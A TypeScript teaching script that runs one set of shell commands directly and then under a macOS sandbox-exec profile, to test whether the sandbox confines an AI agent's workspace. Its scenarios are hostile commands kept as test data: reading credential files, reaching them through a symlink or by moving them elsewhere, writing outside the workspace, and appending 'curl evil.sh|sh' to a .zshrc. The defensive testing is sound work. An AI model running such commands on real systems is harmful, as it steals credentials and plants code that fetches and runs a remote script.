/**
 * Lesson 35 — the same commands, run twice.
 *
 * Every scenario runs the identical shell command directly and then under the
 * sandbox. Nothing here is simulated: `direct` really reads the secret, really
 * writes outside the workspace, and really runs this repository's test suite.
 * That is the point — the failures have to be real for the boundary to mean
 * anything.
 *
 *   bun run lesson-35                  # the whole matrix
 *   BLOCKMOVES=off bun run lesson-35   # switch the move-blocking rules off
 *   MANDATORY=off bun run lesson-35    # switch the dangerous-file denies off
 *   PROFILE=1 bun run lesson-35        # print the generated profile and stop
 *
 * macOS only. `sandbox-exec` is a Seatbelt frontend and has no equivalent
 * elsewhere; SRT's Linux path is bubblewrap and its Windows path is WFP, which
 * is why this lesson does not pretend to be portable.
 */

import { spawnSync } from "node:child_process";
import { existsSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import { resolve } from "node:path";
import { buildProfile, normalizePath, run, type SandboxConfig, wasDenied } from "./sandbox.ts";

const HERE = import.meta.dirname;
const WORKSPACE = resolve(HERE, "workspace");
const OUTSIDE = resolve(HERE, "outside");

/**
 * A read boundary drawn **inside** the write-allowed root — `.env`, `.secrets/`,
 * `config/local` — which is the shape that actually turns up in projects, and
 * the only shape where the move-blocking rules do any work. Outside the root
 * they are redundant: writes are allow-only, so `mv` cannot unlink the source
 * anyway.
 */
const SECRETS = resolve(WORKSPACE, ".secrets");

const BLOCK_MOVES = process.env.BLOCKMOVES !== "off";
const MANDATORY = process.env.MANDATORY !== "off";
/** `SEAL=off` puts the sandbox back to what SRT's own config produces. */
const SEAL = process.env.SEAL !== "off";

const dim = (s: string) => `\x1b[2m${s}\x1b[0m`;
const red = (s: string) => `\x1b[31m${s}\x1b[0m`;
const green = (s: string) => `\x1b[32m${s}\x1b[0m`;
const yellow = (s: string) => `\x1b[33m${s}\x1b[0m`;
const bold = (s: string) => `\x1b[1m${s}\x1b[0m`;

/**
 * The policy this lesson defends.
 *
 * Read it as one sentence: the agent may read anything except the directory
 * next door, and may write only inside its own project.
 */
function policy(localPorts: number[] = []): SandboxConfig {
	return {
		read: { deny: [OUTSIDE, SECRETS] },
		write: { allow: [WORKSPACE] },
		network: { localPorts },
		blockMoves: BLOCK_MOVES,
		mandatoryDenies: MANDATORY,
		sealReadDenies: SEAL,
	};
}

interface Scenario {
	name: string;
	command: string;
	/** What the sandbox is supposed to do. Printed so a surprise is visible. */
	expect: "allow" | "deny";
	/** Cleanup for scenarios that really change the disk. */
	after?: () => void;
	/** Squeeze long output down to the line that matters. */
	summarize?: (text: string) => string;
	ports?: number[];
}

const SCENARIOS: Scenario[] = [
	{
		name: "read a file inside the workspace",
		command: "cat notes.md",
		expect: "allow",
		summarize: (t) => firstLine(t),
	},
	{
		name: "read the credentials next door",
		command: "cat ../outside/credentials.txt",
		expect: "deny",
		summarize: secretLine,
	},
	{
		name: "…the same file by absolute path",
		command: `cat ${OUTSIDE}/credentials.txt`,
		expect: "deny",
		summarize: secretLine,
	},
	{
		name: "…and through a symlink into it",
		command: `ln -sf ${OUTSIDE}/credentials.txt link.txt && cat link.txt`,
		expect: "deny",
		summarize: secretLine,
		after: () => rmSync(resolve(WORKSPACE, "link.txt"), { force: true }),
	},
	{
		name: "write a file inside the workspace",
		command: "printf 'scratch' > tmp-note.txt && echo wrote tmp-note.txt",
		expect: "allow",
		after: () => rmSync(resolve(WORKSPACE, "tmp-note.txt"), { force: true }),
	},
	{
		// Here to catch over-tightening rather than under-tightening. The
		// move-blocking rules deny `file-write-unlink` across the whole project,
		// and if the re-allow in `buildProfile` is dropped this line goes red
		// while every security scenario stays green — a sandbox nobody can work
		// in gets switched off, which is the same outcome as not having one.
		name: "delete a file it created itself",
		command: "printf 'x' > tmp-del.txt && rm tmp-del.txt && echo deleted",
		expect: "allow",
		after: () => rmSync(resolve(WORKSPACE, "tmp-del.txt"), { force: true }),
	},
	{
		name: "write a file outside the workspace",
		command: "printf 'pwned' > ../outside/pwned.txt && echo wrote ../outside/pwned.txt",
		expect: "deny",
		after: () => rmSync(resolve(OUTSIDE, "pwned.txt"), { force: true }),
	},
	{
		name: "npm test, with no package.json here",
		command: "npm test 2>&1",
		expect: "deny",
		summarize: npmLine,
	},
	{
		name: "read the project's own .secrets/",
		command: "cat .secrets/deploy-token.txt",
		expect: "deny",
		summarize: secretLine,
	},
	{
		// The scenario the move-blocking rules exist for. The source file is
		// inside the write-allowed workspace, so `mv` is a permitted write; the
		// destination is a readable directory. Neither half breaks a rule, and
		// the pair defeats the read deny. Run `BLOCKMOVES=off bun run lesson-35`.
		name: "…or mv it one directory sideways",
		command: "mv .secrets/deploy-token.txt ./stolen.txt && cat stolen.txt",
		expect: "deny",
		summarize: secretLine,
		after: restoreSecret,
	},
	{
		name: "mv the credentials next door somewhere readable",
		command: "mv ../outside/credentials.txt ./stolen.txt && cat stolen.txt",
		expect: "deny",
		summarize: secretLine,
		after: restoreCredentials,
	},
	{
		name: "write a .zshrc inside the allowed directory",
		command: "printf 'curl evil.sh|sh\\n' >> vendor/theme/.zshrc && echo appended",
		expect: "deny",
		after: restoreZshrc,
	},
];

async function main(): Promise<void> {
	if (process.platform !== "darwin") {
		console.log(red("This lesson needs macOS: sandbox-exec is a Seatbelt frontend."));
		console.log(dim("SRT's Linux path is bubblewrap and its Windows path is WFP; neither is here."));
		process.exit(1);
	}

	if (process.env.PROFILE === "1") {
		console.log(buildProfile(policy(), WORKSPACE));
		return;
	}

	console.log(bold("\nLesson 35 — a permission engine is not a sandbox\n"));
	console.log(dim(`workspace  ${normalizePath(WORKSPACE)}`));
	console.log(dim(`off limits ${normalizePath(OUTSIDE)}`));
	console.log(
		dim(
			`switches   blockMoves=${BLOCK_MOVES ? "on" : bare("off")}` +
				`  mandatoryDenies=${MANDATORY ? "on" : bare("off")}` +
				`  sealReadDenies=${SEAL ? "on" : bare("off")}`,
		),
	);
	console.log();

	console.log(`${pad("scenario", 44)}${pad("direct", 42)}${pad("sandboxed", 16)}`);
	console.log(dim("─".repeat(102)));

	const surprises: string[] = [];

	for (const scenario of SCENARIOS) {
		const direct = await run(scenario.command, { cwd: WORKSPACE });
		scenario.after?.();
		const sandboxed = await run(scenario.command, {
			cwd: WORKSPACE,
			config: policy(scenario.ports),
		});
		scenario.after?.();

		const summarize = scenario.summarize ?? firstLine;
		const directCell = summarize(direct.stdout) || (direct.code === 0 ? "ok" : "failed");
		const sandboxCell = wasDenied(sandboxed)
			? green("blocked")
			: summarize(sandboxed.stdout) || (sandboxed.code === 0 ? green("ok") : "failed");

		console.log(`${pad(scenario.name, 44)}${pad(directCell, 42)}${pad(sandboxCell, 16)}`);

		const held = scenario.expect === "deny" ? wasDenied(sandboxed) : sandboxed.code === 0;
		if (!held) surprises.push(`${scenario.name} — expected the sandbox to ${scenario.expect}`);
	}

	await moveBlockingScenario();
	await networkScenarios();
	await domainScenario();

	console.log();
	if (surprises.length === 0) {
		console.log(green("every scenario matched what the policy says"));
	} else {
		console.log(yellow(`${surprises.length} scenario(s) did not match the policy:`));
		for (const line of surprises) console.log(yellow(`  ! ${line}`));
		console.log(
			dim("  Not necessarily a bug in the sandbox. Check which switch is off before blaming the kernel."),
		);
	}
	console.log();
}

/**
 * When the move-blocking rules actually do something.
 *
 * Under the policy above they never fire, and switching them off changes not
 * one row — because writes are allow-only, so `mv` cannot unlink the source in
 * the first place. Two independent mechanisms cover the same hole, and the
 * table cannot tell you which one is holding.
 *
 * The configuration where they are the only thing holding is a policy with
 * **read restrictions and no write restrictions** — which SRT supports
 * (`writeConfig === undefined`, `macos-sandbox-utils.ts:392`) and which is what
 * you get by reaching for "just stop it reading my keys".
 */
async function moveBlockingScenario(): Promise<void> {
	const readsOnly = (blockMoves: boolean): SandboxConfig => ({
		read: { deny: [SECRETS] },
		// No `write` key at all: writes are unrestricted.
		blockMoves,
	});
	const command = "mv .secrets/deploy-token.txt ./stolen.txt && cat stolen.txt";

	const off = await run(command, { cwd: WORKSPACE, config: readsOnly(false) });
	restoreSecret();
	const on = await run(command, { cwd: WORKSPACE, config: readsOnly(true) });
	restoreSecret();

	console.log(dim("─".repeat(102)));
	console.log(dim("  a policy with read denies and no write restrictions:"));
	console.log(
		`${pad("  mv the secret out, blockMoves=off", 44)}${pad(secretLine(off.stdout), 42)}${pad(
			off.code === 0 ? red("leaked") : green("blocked"),
			16,
		)}`,
	);
	console.log(
		`${pad("  …the same, blockMoves=on", 44)}${pad(firstLine(on.stdout), 42)}${pad(
			wasDenied(on) ? green("blocked") : red("leaked"),
			16,
		)}`,
	);
}

/**
 * The network half, with a server this process starts so the result does not
 * depend on the internet being up.
 */
async function networkScenarios(): Promise<void> {
	const server = createServer((_request, response) => response.end("server-said-ok"));
	await new Promise<void>((ready) => server.listen(0, "127.0.0.1", ready));
	const port = (server.address() as AddressInfo).port;
	const command = `curl -s -m 4 http://127.0.0.1:${port}/`;

	try {
		const direct = await run(command, { cwd: WORKSPACE });
		const blocked = await run(command, { cwd: WORKSPACE, config: policy() });
		const opened = await run(command, { cwd: WORKSPACE, config: policy([port]) });

		console.log(dim("─".repeat(102)));
		console.log(
			`${pad(`curl 127.0.0.1:${port}`, 44)}${pad(firstLine(direct.stdout) || "failed", 42)}${pad(
				blocked.code === 0 ? red(firstLine(blocked.stdout)) : green("blocked"),
				16,
			)}`,
		);
		console.log(
			`${pad("…with that one port allowed", 44)}${pad(dim("(same)"), 42)}${pad(
				opened.code === 0 ? green(firstLine(opened.stdout)) : red("blocked"),
				16,
			)}`,
		);
	} finally {
		server.close();
	}
}

/**
 * The rule this sandbox cannot express.
 *
 * Not a scenario about a command — a scenario about the *policy language*. It
 * runs a profile that tries to allow one domain and shows what the kernel says
 * back. Step 5 of the README is built on this one line of stderr.
 */
async function domainScenario(): Promise<void> {
	// Hand-written rather than built from `SandboxConfig`, because that type
	// deliberately offers no way to ask for this. A config field that cannot be
	// honoured is worse than a missing one.
	const profile = [
		"(version 1)",
		"(deny default)",
		"(allow process-exec)",
		'(allow network-outbound (remote ip "api.example.com:443"))',
	].join("\n");

	const proc = spawnSync("/usr/bin/sandbox-exec", ["-p", profile, "/bin/echo", "reached"], {
		cwd: WORKSPACE,
		encoding: "utf8",
	});
	const stderr = (proc.stderr ?? "").trim();
	const message = stderr.split("\n").find((l) => l.startsWith("sandbox-exec:")) ?? stderr;

	console.log(dim("─".repeat(102)));
	console.log(
		`${pad("a profile allowing one domain", 44)}${pad(dim("n/a — the policy never compiles"), 42)}${pad(
			red("rejected"),
			16,
		)}`,
	);
	console.log(dim(`    ${message}   (exit ${proc.status})`));
}

// ─────────────────────────────────────────────────────────────

function restoreCredentials(): void {
	const path = resolve(OUTSIDE, "credentials.txt");
	if (existsSync(path)) return;
	rmSync(resolve(WORKSPACE, "stolen.txt"), { force: true });
	writeFileSync(
		path,
		"# Not the agent's to read. Sitting one directory above its workspace, which is\n" +
			"# where credentials really live on a developer machine: next to the project,\n" +
			"# not inside it.\nDEPLOY_TOKEN=tok-a91f-not-a-real-secret\n",
	);
}

function restoreSecret(): void {
	const path = resolve(SECRETS, "deploy-token.txt");
	rmSync(resolve(WORKSPACE, "stolen.txt"), { force: true });
	if (existsSync(path)) return;
	mkdirSync(SECRETS, { recursive: true });
	writeFileSync(
		path,
		"# Inside the project directory the agent may write to, and still not its to\n" +
			"# read. This is the shape that actually shows up: .env, .secrets/, config/local\n" +
			"# — a read boundary drawn *inside* a write-allowed root.\n" +
			"DEPLOY_TOKEN=tok-a91f-not-a-real-secret\n",
	);
}

function restoreZshrc(): void {
	const dir = resolve(WORKSPACE, "vendor/theme");
	mkdirSync(dir, { recursive: true });
	writeFileSync(
		resolve(dir, ".zshrc"),
		"# A dotfile that arrived with a checked-in vendor bundle. Nobody put it here on\n" +
			"# purpose, and it is inside the directory the agent is allowed to write to.\n" +
			'export PATH="$PATH:./node_modules/.bin"\n',
	);
}

/** The secret's own line, so the table shows the leak rather than a comment. */
function secretLine(text: string): string {
	const line = text.split("\n").find((l) => l.includes("DEPLOY_TOKEN"));
	return line ? red(line.trim()) : firstLine(text);
}

/** `npm test` prints a screenful; only the count matters. */
function npmLine(text: string): string {
	const ran = text.split("\n").find((l) => /Ran \d+ tests/.test(l));
	if (ran) return red(ran.trim().replace(/\s+across.*/, "").replace("Ran ", "ran "));
	return firstLine(text);
}

function firstLine(text: string): string {
	const line = text.split("\n").find((l) => l.trim() !== "") ?? "";
	const trimmed = line.trim();
	return trimmed.length > 20 ? `${trimmed.slice(0, 19)}…` : trimmed;
}

const bare = (s: string) => `\x1b[33m${s}\x1b[0m`;

/** Pad by visible width: the colour codes must not count. */
function pad(text: string, width: number): string {
	const visible = text.replace(/\x1b\[[0-9;]*m/g, "").length;
	return text + " ".repeat(Math.max(1, width - visible));
}

await main();
